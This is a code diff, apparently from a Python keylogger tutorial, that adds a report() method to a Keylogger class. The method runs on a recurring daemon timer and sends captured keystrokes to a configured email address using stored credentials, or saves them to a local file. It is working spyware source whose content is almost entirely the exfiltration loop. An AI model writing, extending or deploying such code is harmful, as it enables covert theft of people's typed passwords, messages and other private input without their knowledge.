@@ -9,6 +9,7 @@ from config import EMAIL_PASSWORD
 from datetime import datetime  # for getting the current time
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from threading import Timer
 
 # initializing the variables
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
@@ -112,3 +113,37 @@ class Keylogger:
         if verbose:
             print(f"{datetime.now()} -Sent an email to {email} containing : {message}")
 
+    """
+    So we are checking if the self.log variable got something (the user pressed something in that period).
+    If it is the case, then report it by either saving it to a local file or sending it as an email.
+
+    And then we passed the self.interval (in this tutorial, I've set it to 1 minute or 60 seconds, 
+    feel free to adjust it to your needs), and the function self.report() to Timer() class, 
+    and then call the start() method after we set it as a daemon thread.
+
+    This way, the method we just implemented sends keystrokes to email or saves them to a local file
+    (based on the report_method) and calls itself recursively each self.interval seconds in separate threads.
+    """
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you don't want to print in the console, comment below line
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
